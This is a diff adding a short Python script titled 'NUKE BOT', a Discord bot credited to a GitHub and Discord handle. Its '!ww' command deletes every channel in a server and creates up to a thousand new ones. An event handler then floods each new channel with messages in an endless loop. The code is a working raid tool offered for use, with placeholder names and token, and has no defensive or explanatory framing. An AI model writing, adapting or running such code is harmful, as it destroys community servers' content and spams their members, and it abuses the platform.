@@ -1,0 +1,67 @@
+NUKE BOT
+
+
+##Made By @rdz1337 on github & rdz、#0999 On Discord
+import discord
+from discord.ext import commands
+import random
+from discord import Permissions
+import os
+import colorama
+from colorama import Fore, Style
+import asyncio
+from discord_webhook import DiscordWebhook, DiscordEmbed
+
+
+CHANNEL_NAMES = ["TEXT HERE"]
+
+MESSAGE_CONTENTS = ["TEXT HERE","TEXT HERE"]
+
+##PREFIX##
+ 
+bot = commands.Bot(command_prefix='!')
+ 
+client = commands.Bot(command_prefix='!')
+ 
+##OTHER##
+bot.remove_command('help')
+
+
+@bot.event
+async def on_ready():
+   await bot.change_presence(activity=discord.Game(name="!ww"))
+   print("Logged in as {}! Prefix Is !ww".format(bot.user.name))
+
+print('The Bot Is Now Ready !')
+
+
+
+
+
+
+
+@bot.command()
+async def ww(ctx, amount=1000):
+   channels = ctx.guild.channels
+   for channel in channels:
+      try:
+          await channel.delete()
+          print(channel.name + "has been deleted.")
+      except Exception as error:
+         print(channel.name + "has failed to be deleted")
+         print(error)
+   guild = ctx.message.guild
+   for i in range(amount):
+         await guild.create_text_channel(random.choice(CHANNEL_NAMES))
+
+@bot.event
+async def on_guild_channel_create(channel):
+  while True:
+    await channel.send(random.choice(MESSAGE_CONTENTS))
+ 
+
+
+
+ 
+##BOT TOKEN##
+bot.run ("TOKEN HERE")
